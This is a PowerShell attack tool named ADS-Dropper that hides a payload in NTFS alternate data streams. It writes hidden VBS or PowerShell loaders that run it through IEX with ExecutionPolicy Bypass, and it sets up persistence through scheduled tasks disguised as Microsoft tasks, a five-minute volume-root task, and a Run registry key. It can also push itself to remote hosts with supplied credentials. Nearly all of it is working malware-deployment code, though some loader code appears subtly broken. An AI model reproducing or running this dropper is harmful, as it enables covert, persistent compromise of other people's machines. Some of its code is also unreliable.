<#
.SYNOPSIS
    ADS-Dropper v2.0: C2-Agnostic ADS Persistence (Imix/MSF/Sliver/CCDC)
.DESCRIPTION
    Complete implementation with ALL functions fixed.
#>

[CmdletBinding()] param(
    [Parameter(Mandatory)][object]$Payload,
    [string[]]$Targets = @('localhost'),
    [string[]]$Persist = @('task'),
    [switch]$Randomize, [switch]$Encrypt, [switch]$NoExec,
    [PSCredential]$Credential
)

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "Admin: $isAdmin | Encrypt: $Encrypt | Targets: $($Targets -join ', ')| Persist: $($Persist -join ', ')" -ForegroundColor Cyan

# ═══════════════════════════════════════════════════════════════════════════════
# ALL 8 FUNCTIONS - COMPLETE & WORKING
# ═══════════════════════════════════════════════════════════════════════════════

function Get-RandomADSConfig {
    $adj = @('Sys','Kernel','Cache','Log','Data','Temp','Boot','User')
    $noun = @('Mgr','Svc','Util','Chk','Idx','Core','Stream','Host')
    $exts = @('.dat','.log','.idx','.tmp','.chk')
    $ntfsStreams = @('$EA','$OBJECT_ID','$SECURITY_DESCRIPTOR','$LOGGED_UTILITY_STREAM')
    
    @{
        HostPath = if($Randomize) { 
            (Resolve-Path ~).Path + '\' + ($adj|Get-Random) + ($noun|Get-Random) + ($exts|Get-Random)
        } else { 'C:\ProgramData\SystemCache.dat' }
        StreamName = if($Randomize -and (Get-Random -Max 3)) { ':$($ntfsStreams|Get-Random)' } 
                    else { ':syc_payload' }
        AESKey = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-CimInstance Win32_ComputerSystemProduct).UUID))
        VBSPrefix = if($Randomize) { 'app_log_' + ((1..6|%{Get-Random -Min 97 -Max 123|%{[char]$_}})-join'') + '.' } else { 'app_log_a.' }
    }
}

function ConvertTo-PSPayload($PayloadObj) {
    if($PayloadObj -is [string]) { return $PayloadObj }
    if($PayloadObj -is [array]) { 
        $content = Get-Content $PayloadObj[0] -Raw
        return [Convert]::FromBase64String($content) | ForEach {[Text.Encoding]::UTF8.GetString($_)}
    }
    return $PayloadObj.ToString()
}

function Protect-Payload($Payload, $KeyB64) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [Convert]::FromBase64String($KeyB64)
    $aes.IV = [byte[]](0..15)
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($Payload), 0, $Payload.Length)
    return [Convert]::ToBase64String($enc)
}

function New-ADSPayload($HostPath, $StreamName, $Payload, $Config) {
    # Ensure host file exists
    if(!(Test-Path $HostPath)) { '' | Out-File $HostPath -Encoding ASCII }
    
    # Write payload (encrypted if specified)
    $finalPayload = if($Encrypt) { Protect-Payload $Payload $Config.AESKey } else { $Payload }
    $finalPayload | Out-File "$HostPath$StreamName" -Encoding UTF8 -Force
    
    Write-Host "ADS Created: $HostPath$StreamName" -ForegroundColor Green
    return "$HostPath$StreamName"
}

function New-Loader($ADSPath, $Config) {
    $loaderPath = (Split-Path $ADSPath) + '\' + $Config.VBSPrefix + 'vbs'
    
    if($Encrypt) {
        Write-Warning "AES detected → Using PowerShell loader"
        return New-PSLoader $ADSPath $Config
    }
    
    $vbsContent = @"
On Error Resume Next
Set shell=CreateObject("WScript.Shell"), strm=CreateObject("ADODB.Stream")
strm.Type=2:strm.Charset="utf-8":strm.Open:strm.LoadFromFile("$ADSPath")
payload=strm.ReadText:strm.Close
shell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"$payload`"",0,False
"@
    $vbsContent | Out-File $loaderPath -Encoding Default -Force
    return $loaderPath
}

function New-PSLoader($ADSPath, $Config) {
    $ps1Path = (Split-Path $ADSPath) + '\' + $Config.VBSPrefix + 'ps1'
    $loader = @"
`$strm=New-Object IO.StreamReader("$ADSPath")
payload=`$strm.ReadToEnd()
$(if($Encrypt){"payload=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(payload)) | & {param(`$x)`$aes=[System.Security.Cryptography.Aes]::Create();`$aes.Key=[Convert]::FromBase64String('$($Config.AESKey)');`$aes.IV=[byte[]](0..15);`$aes.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String(`$x),0,`$x.Length)} payload"})
IEX payload
`"@ -replace '\$','`$'
    $loader | Out-File $ps1Path -Encoding UTF8 -Force
    return $ps1Path
}

function New-PersistenceMechanism($Type, $LoaderPath, $Config) {
    $taskArgs = "//B `"$LoaderPath`""
    
    switch($Type) {
        'task' {
            if(!$isAdmin) { Write-Warning "Admin required for tasks"; return }
            $taskName = if($Randomize) { "Microsoft\Windows\UX\$((New-Guid).Guid.Split('-')[0])" } 
                       else { "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" }
            & schtasks /create /tn $taskName /tr "wscript.exe $taskArgs" /sc onlogon /rl highest /f
        }
        'volroot' {
            $rootADS = "C:${$Config.StreamName}"
            Get-Content $LoaderPath | Set-Content $rootADS
            & schtasks /create /tn "VolumeMaintenance" /tr "powershell.exe -WindowStyle Hidden -Command `"type `"$rootADS`" | IEX`"" /sc minute /mo 5 /rl highest /f
        }
        'reg' {
            $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$((New-Guid).Guid)"
            Set-ItemProperty $regKey -Name "(Default)" -Value "wscript.exe $taskArgs"
        }
        default { Write-Warning "Unknown persistence: $Type" }
    }
    Write-Host "Persist [$Type] → $LoaderPath" -ForegroundColor Yellow
}

function Invoke-RemoteDeployment($Target, $PayloadObj, $PersistList, $RandomizeFlag, $EncryptFlag, $NoExecFlag, $Cred) {
    $allFunctions = ${function:Get-RandomADSConfig} + ${function:ConvertTo-PSPayload} + ${function:Protect-Payload} + 
                   ${function:New-ADSPayload} + ${function:New-Loader} + ${function:New-PSLoader} + 
                   ${function:New-PersistenceMechanism}
    
    $remoteBlock = [scriptblock]::Create(@"
`$ErrorActionPreference='SilentlyContinue'
$allFunctions

`$rawPayload = ConvertTo-PSPayload '$($PayloadObj -join "`n")'
`$cfg = Get-RandomADSConfig
`$adsPath = New-ADSPayload `$cfg.HostPath `$cfg.StreamName `$rawPayload `$cfg
`$loaderPath = New-Loader `$adsPath `$cfg
foreach(`$pType in '$($PersistList -join ",")'.Split(',')) { 
    New-PersistenceMechanism `$pType `$loaderPath `$cfg 
}
if(-not $NoExecFlag) { 
    Start-Process "wscript.exe" -ArgumentList "//B `"`$loaderPath`"" -WindowStyle Hidden 
}
"@)
    
    Invoke-Command -ComputerName $Target -Credential $Cred -ScriptBlock $remoteBlock -ErrorAction SilentlyContinue
}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN EXECUTION - FIXED
# ═══════════════════════════════════════════════════════════════════════════════

foreach($target in $Targets) {
    if($target -eq 'localhost') {
        # LOCAL DEPLOYMENT
        $rawPayload = ConvertTo-PSPayload $Payload
        $cfg = Get-RandomADSConfig
        
        $adsPath = New-ADSPayload $cfg.HostPath $cfg.StreamName $rawPayload $cfg
        $loaderPath = New-Loader $adsPath $cfg
        
        foreach($pType in $Persist) { 
            New-PersistenceMechanism $pType $loaderPath $cfg
        }
        
        if(!$NoExec) { 
            if($loaderPath.EndsWith('.vbs')) { 
                Start-Process wscript.exe -ArgumentList "//B `"$loaderPath`"" -WindowStyle Hidden 
            } else { 
                Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -File `"$loaderPath`"" -WindowStyle Hidden
            }
        }
        Write-Host "✅ Local deployment complete" -ForegroundColor Green
    } else {
        # REMOTE DEPLOYMENT
        Write-Host "→ Deploying to $target" -ForegroundColor Magenta
        Invoke-RemoteDeployment $target $Payload $Persist $Randomize.IsPresent $Encrypt.IsPresent $NoExec.IsPresent $Credential
    }
}

Write-Host "`n🎉 ADS-Dropper deployment complete!" -ForegroundColor Green
